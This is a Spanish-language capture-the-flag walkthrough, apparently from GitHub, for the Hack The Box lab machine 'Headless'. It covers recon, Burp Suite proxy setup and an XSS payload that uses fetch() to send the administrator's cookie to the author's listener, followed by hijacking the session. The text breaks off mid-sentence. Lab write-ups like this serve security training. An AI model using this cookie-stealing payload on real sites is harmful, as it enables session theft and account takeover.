#MÁQUINA HEADLESS

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/9f252485-3b0e-4e77-9f7b-cd3f3ec93386)

En primera instancia, procedemos a conectarnos a la VPN

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/498cb47d-d1a2-4b5b-89db-fa41153793f6)

Una vez conectados, procedemos a hacer el Nmap a la ip de la maquina (10.10.11.8)

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/62f3c5df-2a57-4f87-a10d-0b547fb749d9)

Como podemos apreciar, tenemos dos puertos abiertos, el puerto 5000/tcp indica que el puerto 5000 está abierto y está utilizando el protocolo TCP (Transmission Control Protocol). En este caso, también se especifica que el servicio que está utilizando este puerto es "upnp". UPnP (Universal Plug and Play) es un conjunto de protocolos de red que permite a dispositivos en una red comunicarse entre sí sin necesidad de configuración manual por parte del usuario o un administrador de red.

En este caso vamos a tratar de entrar a este puerto. 

Si nos vamos al navegador y ponemos la ip de la maquina junto con el puerto (10.10.11.8:5000) podremos apreciar lo siguiente

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/131640d5-e21b-422b-b9bb-9ae8b848d582)

Si presionamos el botón “For questions” podremos apreciar lo siguiente: 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/6f9f8931-4dae-4966-82b6-c04a6272a059)

Si en Message, podemos un código, en este caso la etiqueta script para causar error a propósito (Pues no está finalizado el cierre), podremos apreciar lo siguiente

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/443744f1-606c-4931-acbe-a08a86c5bb22)

Donde podremos ver el cookie del administrador, pero esto aún no es para iniciar sesión como este. 

Podremos ver el mismo valor si inspeccionamos la página y ns dirigimos a "Storage":

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/9de3e621-dd0e-435f-ab09-f2787352ab93)

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/91a41c5c-9476-4be6-9120-82ff7ff37d30)

#CONFIGURACIÓN BURP SUITE

En primera instancia procedemos a configurar nuestro Burp Suite, agregando un proxy con la ip y puerto '127.0.0.1:8080'

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/606f6dbd-1b2a-41b8-9786-67c7443584b8)

Y luego procedemos a instalar la extensión 'FoxyProxy' para poder escuchar y hacer peticiones a la página que se mostró en un principió.

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/18908790-ead9-4e02-8ed2-04249bb878b7)


![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/cc9280e4-f67a-46ab-9bef-ddfcbd4897a6)

Una vez instalada procedemos a irnos a opciones: 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/8affec6d-3e87-4d2b-a0fa-d5e8ffcf95e7)

Y luego a 'Proxies' con la misma ip y puerto que tenemos en el Burp Suite

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/f1cefa7d-186a-4e3a-9a1e-7d8835f4b12c)

Nos tendrá que aparecer algo así:


![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/c4b9f52f-e147-4663-a9e3-6165aaad5c09)

Seleccionamos el que hemos creado y seleccionamos el botón Submmit para luego dirigirnos al apartado de Proxy en Burp. La petición se verá así:

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/06489428-6891-4491-ba17-66e0bd97dc4e)

Le damos clic derecho y lo enviamos al 'Repeater' para realizar las peticiones:


![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/ca86451e-9974-4fbd-b53e-4fac23608f56)


![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/8bbb56fb-4598-4f91-8041-57e67bd18334)

#INICIO HACKEO

Primero procedemos a conocer la ip de nuestra máquina virtual:

```
ip a
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/8c0c0378-3daa-4269-a827-0f90a27580ab)

Lugo pondremos a escuchar un puerto, en este caso es: 1234

```
python3 -m http.server 1234
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/1e55d1d6-da06-4c4d-bb7c-8d7d3ad59eac)

Para luego enviar la siguiente solicitud en el campo 'message' con la ip de la máquina y el puerto que pusimos a escuchar para obtener el cookie de la página para acceder como administrador

```
<img src=x onerror=fetch('http://10.10.14.28:1234/'+document.cookie);>
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/805d6cc8-efff-4827-a678-b99bc9ad734f)

Luego de enviarla veremos que se obtuvo lo siguiente 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/13111897-cc7f-4468-b1ce-b0a86bcc7abd)

Donde podemos observar el valor de la llave del administrador

Luego, nos vamos a inspeccionar de nuevo la pagina web y nos vamos a 'Storage para reemmplazar el valor de la cookie del administradir por el nuevo que nos trajo cuando se escuchó el puerto:

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/c0518daf-fcbe-44e9-811f-5a16b36c8157)

Recargamos y como podemos ver tenemos acceso al panel del administrador

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/3d9f991f-97db-4dcd-8c24-af91e57568d9)

Y al presionar el botón 'Generate Report' podremos ver la petición en el Burp Suite, donde la enviaremos al 'Repeater'

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/70c9c307-27f9-4a36-a987-dc4a061517e8)

Una ve








